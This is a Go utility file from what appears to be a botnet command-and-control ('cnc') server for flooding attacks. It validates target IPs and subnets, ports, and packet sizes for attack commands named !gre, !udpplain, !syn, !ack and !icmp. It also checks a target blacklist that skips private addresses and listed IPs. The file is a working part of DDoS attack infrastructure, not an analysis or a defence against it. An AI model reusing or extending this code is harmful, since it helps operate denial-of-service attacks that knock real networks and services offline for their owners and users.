package util

import (
	"cnc/internal/models"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
)

func ValidateIP(ip string) bool {
	return net.ParseIP(ip) != nil
}

func ValidatePort(port int) bool {
	return port > 0 && port <= 65535
}

func ValidatePsize(psize int, cmd string) bool {
	if psize <= 0 {
		return false
	}
	if strings.HasPrefix(cmd, "!gre") && psize > 8192 {
		return false
	}
	if strings.HasPrefix(cmd, "!udpplain") && psize > 1450 {
		return false
	}
	if (strings.HasPrefix(cmd, "!syn") || strings.HasPrefix(cmd, "!ack") || strings.HasPrefix(cmd, "!icmp")) && psize > 64500 {
		return false
	}
	return true
}

func ValidateSrcPort(srcport int) bool {
	return srcport > 0 && srcport <= 65535
}

func IsValidInt(s string) bool {
	_, err := strconv.Atoi(s)
	return err == nil
}

func isPrivateIP(ipStr string) bool {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return false
	}

	privateIPBlocks := []*net.IPNet{}
	for _, cidr := range []string{
		"10.0.0.0/8",
		"172.16.0.0/12",
		"192.168.0.0/16",
		"127.0.0.0/8",
		"169.254.0.0/16",
		"0.0.0.0/8",
	} {
		_, block, _ := net.ParseCIDR(cidr)
		privateIPBlocks = append(privateIPBlocks, block)
	}

	for _, block := range privateIPBlocks {
		if block.Contains(ip) {
			return true
		}
	}
	return ip.IsLoopback() || ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() || ip.IsMulticast()
}

func IsBlacklisted(ip string) bool {
	if isPrivateIP(ip) {
		return true
	}

	file, err := os.ReadFile("database/blacklistedtargets.json")
	if err != nil {
		return false
	}

	var config models.BlacklistConfig
	if err := json.Unmarshal(file, &config); err != nil {
		fmt.Println("Warning: could not parse blacklistedtargets.json:", err)
		return false
	}

	for _, blacklistedIP := range config.BlacklistedIPs {
		if blacklistedIP == ip {
			return true
		}
	}
	return false
}

func ValidateIPOrSubnet(ip string) bool {
	if strings.Contains(ip, "/") {
		parts := strings.Split(ip, "/")
		if len(parts) != 2 {
			return false
		}
		cidr, err := strconv.Atoi(parts[1])
		if err != nil || cidr < 1 || cidr > 32 {
			return false
		}
		return ValidateIP(parts[0])
	}
	return ValidateIP(ip)
}
